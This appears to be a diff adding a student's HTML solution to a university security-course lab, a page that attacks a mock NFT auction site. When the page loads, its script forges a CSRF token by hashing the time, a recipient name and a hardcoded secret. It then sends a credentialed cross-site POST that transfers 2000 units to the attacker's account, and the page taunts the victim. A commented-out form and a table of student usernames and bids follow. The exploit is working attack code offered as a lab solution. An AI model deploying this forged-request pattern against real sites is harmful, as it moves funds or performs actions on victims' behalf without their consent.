@@ -1,0 +1,65 @@
+<html>
+    <head>
+        <link rel="shortcut icon" href="#">
+
+        <title>DCASH NFT AUCTION STATUS</title>
+    
+        <!-- Inserted the full url here, instead of just ___.js as so on -->
+        <script src="https://insecurityclass.cs.uchicago.edu/3/sjcl.js"></script>
+        <script src="https://insecurityclass.cs.uchicago.edu/3/sha512.js"></script>
+        <script src="https://insecurityclass.cs.uchicago.edu/3/codecHex.js"></script>
+        <script src="https://insecurityclass.cs.uchicago.edu/3/codecString.js"></script>
+        <script src="https://insecurityclass.cs.uchicago.edu/3/bitArray.js"></script>
+        <script>
+
+        function computecsrf() {
+            var recipientname = "utkarsht";
+            var csrftoken = 
+sjcl.codec.hex.fromBits(sjcl.hash.sha512.hash(String(Math.floor(Date.now() / 10000)) + 
+recipientname + "imaginaryappalachia"));
+            var xhttp = new XMLHttpRequest();
+            var start_url = "https://insecurityclass.cs.uchicago.edu/3/transfer.php";
+
+            xhttp.open("POST", start_url, true);
+            xhttp.withCredentials = true;
+
+            console.log(xhttp.response);
+            console.log(xhttp.status);
+
+            var form_data = new FormData();
+            form_data.set('amount', 2000);
+            form_data.set('recipient', recipientname);
+            form_data.set('csrftoken', csrftoken);
+
+            <!-- xhttp.send("?amount=200&recipient=" + recipientname + "&csrftoken=" + 
+csrftoken); -->
+            xhttp.send(form_data);
+        }
+
+        computecsrf();
+        
+
+        </script>
+    </head>
+<body>
+
+<p>Welcome to the HACKERS' page.</p>
+<hr />
+Welcome back, Founder! My God, you are so dead. <br />
+
+
+
+<!-- <form action="https://insecurityclass.cs.uchicago.edu/3/transfer.php" method="post">
+    <input type="text" id="amount" name="amount" placeholder="10" /> (Amount) <br />
+    <input type="text" id="recipient" name="recipient" placeholder="blase" 
+onkeyup="computecsrf();" /> (NFT Owner) <br />
+    <input type="hidden" id="csrftoken" name="csrftoken" value="">
+    <input type="submit" value="Bid" />
+</form> -->
+<hr />
+<!-- Current status (reset hourly):<br /> -->
+<!-- <table border='2'><tr><th>NFT Creator</th><th>Current 
+Bid</th></tr><tr><td>a2bailey</td><td>0</td></tr><tr><td>aaxia</td><td>0</td></tr><tr><td>adin</td><td>0</td></tr><tr><td>adingitig</td><td>0</td></tr><tr><td>akivah</td><td>0</td></tr><tr><td>akriegel</td><td>0</td></tr><tr><td>alexbuz</td><td>0</td></tr><tr><td>alysoliman</td><td>0</td></tr><tr><td>ambr</td><td>0</td></tr><tr><td>anchristensen</td><td>0</td></tr><tr><td>asbukowski</td><td>0</td></tr><tr><td>averyzhou</td><td>0</td></tr><tr><td>awliu2</td><td>42069</td></tr><tr><td>bburgess19</td><td>0</td></tr><tr><td>bhalla</td><td>0</td></tr><tr><td>bingqiwang</td><td>0</td></tr><tr><td>blase</td><td>0</td></tr><tr><td>brandonli</td><td>0</td></tr><tr><td>breid026</td><td>0</td></tr><tr><td>brtucker</td><td>0</td></tr><tr><td>charlieweiler</td><td>0</td></tr><tr><td>chrismarshall</td><td>0</td></tr><tr><td>contrerasl24</td><td>0</td></tr><tr><td>cormac</td><td>0</td></tr><tr><td>dagm</td><td>0</td></tr><tr><td>dassamongkol</td><td>0</td></tr><tr><td>davidcash</td><td>0</td></tr><tr><td>davidspitz</td><td>0</td></tr><tr><td>dcarnecchia</td><td>0</td></tr><tr><td>ddopfner</td><td>0</td></tr><tr><td>derekli</td><td>0</td></tr><tr><td>dfgreenstone</td><td>0</td></tr><tr><td>diepc</td><td>0</td></tr><tr><td>dingyisun</td><td>0</td></tr><tr><td>dkisanga</td><td>100</td></tr><tr><td>dunnsamantha</td><td>0</td></tr><tr><td>dxue</td><td>0</td></tr><tr><td>ejcrane</td><td>0</td></tr><tr><td>eprhodes</td><td>0</td></tr><tr><td>ericliu1</td><td>0</td></tr><tr><td>faradawn</td><td>0</td></tr><tr><td>gallom</td><td>0</td></tr><tr><td>gavallejo02</td><td>0</td></tr><tr><td>gusw</td><td>0</td></tr><tr><td>hallme</td><td>0</td></tr><tr><td>hanzhit</td><td>0</td></tr><tr><td>hasanj</td><td>0</td></tr><tr><td>hsagawa</td><td>0</td></tr><tr><td>hsmith9</td><td>0</td></tr><tr><td>hwilliams10</td><td>0</td></tr><tr><td>igalakhov</td><td>21</td></tr><tr><td>jagunp</td><td>0</td></tr><tr><td>jasulcaf</td><td>0</td></tr><tr><td>jbrouwer</td><td>0</td></tr><tr><td>jcasey</td><td>0</td></tr><tr><td>jettyuen</td><td>0</td></tr><tr><td>jiajunm</td><td>1000</td></tr><tr><td>jingyij</td><td>0</td></tr><tr><td>jkleidermacher</td><td>0</td></tr><tr><td>joeylin</td><td>0</td></tr><tr><td>jonliu</td><td>0</td></tr><tr><td>jslin168</td><td>0</td></tr><tr><td>jtheisen1718</td><td>0</td></tr><tr><td>kanchan</td><td>0</td></tr><tr><td>katiegao</td><td>0</td></tr><tr><td>katiesun</td><td>0</td></tr><tr><td>kgumpula</td><td>0</td></tr><tr><td>kkhabaz</td><td>0</td></tr><tr><td>kseniiakorotenko</td><td>0</td></tr><tr><td>lihanc2002</td><td>0</td></tr><tr><td>lknutson1</td><td>0</td></tr><tr><td>loganq</td><td>0</td></tr><tr><td>lorenzok</td><td>0</td></tr><tr><td>lshestakov</td><td>0</td></tr><tr><td>madhavvats</td><td>0</td></tr><tr><td>mnjoo</td><td>0</td></tr><tr><td>mpbao</td><td>0</td></tr><tr><td>nicoagiunta</td><td>0</td></tr><tr><td>nkbilaver</td><td>0</td></tr><tr><td>oaobielodan</td><td>0</td></tr><tr><td>owenkarpf</td><td>0</td></tr><tr><td>pmohan1</td><td>0</td></tr><tr><td>qcyang</td><td>0</td></tr><tr><td>rachit</td><td>0</td></tr><tr><td>raydipro</td><td>0</td></tr><tr><td>raymondq</td><td>0</td></tr><tr><td>rbhaskar</td><td>0</td></tr><tr><td>rileytao</td><td>0</td></tr><tr><td>rkgillespie</td><td>0</td></tr><tr><td>robinweixi</td><td>5000000</td></tr><tr><td>rothwellz</td><td>0</td></tr><tr><td>rslee</td><td>0</td></tr><tr><td>rvoddhi</td><td>0</td></tr><tr><td>smfrye9755</td><td>0</td></tr><tr><td>snorth</td><td>0</td></tr><tr><td>sonalitara</td><td>0</td></tr><tr><td>sriharin</td><td>0</td></tr><tr><td>sumaiyaa</td><td>0</td></tr><tr><td>sunghun</td><td>0</td></tr><tr><td>tatmaca</td><td>0</td></tr><tr><td>tgao564</td><td>0</td></tr><tr><td>thomasglover</td><td>1000000000000000</td></tr><tr><td>utkarsht</td><td>0</td></tr><tr><td>varad</td><td>0</td></tr><tr><td>vernonli</td><td>0</td></tr><tr><td>vzhang00</td><td>0</td></tr><tr><td>wdolan</td><td>0</td></tr><tr><td>weiz2623</td><td>0</td></tr><tr><td>wpscarborough</td><td>0</td></tr><tr><td>wzeng00</td><td>0</td></tr><tr><td>xalewellen</td><td>0</td></tr><tr><td>yinongw</td><td>0</td></tr><tr><td>yuyuanchen0</td><td>0</td></tr><tr><td>zengjinghan</td><td>0</td></tr><tr><td>zhiyanw</td><td>0</td></tr></table> 
+-->
+</body>
+</html>
